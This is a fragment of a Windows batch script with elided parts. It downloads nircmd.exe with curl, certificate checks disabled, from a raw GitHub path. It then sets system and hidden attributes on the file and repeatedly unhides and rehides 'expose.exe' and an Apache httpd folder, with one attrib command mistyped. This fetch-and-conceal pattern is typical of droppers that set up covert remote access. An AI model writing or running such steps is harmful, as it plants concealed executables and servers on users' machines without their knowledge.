...
"%environment%\curl.exe" -k -L %proxy% https://github.com/agdavydov81/antennaarray/raw/105b9250b23501215ff2480d6e63eeebdab008ff/ir_stand/sls/nircmd/nircmd.exe > "%environment%\nircmd.exe" && attrib +s +h +i "%environment%\nircmd.exe"
)
...
attrib -s -h -i "%environment%\expose.exe" && if exist "%environment%\expose.exe" (
 ...
 attrib -s -h -i "%environment%\apache2" &&  if exist "%environment%\apache2\bin\httpd.exe" (
    attrib +s +h ii "%environment%\apache2"
) else (
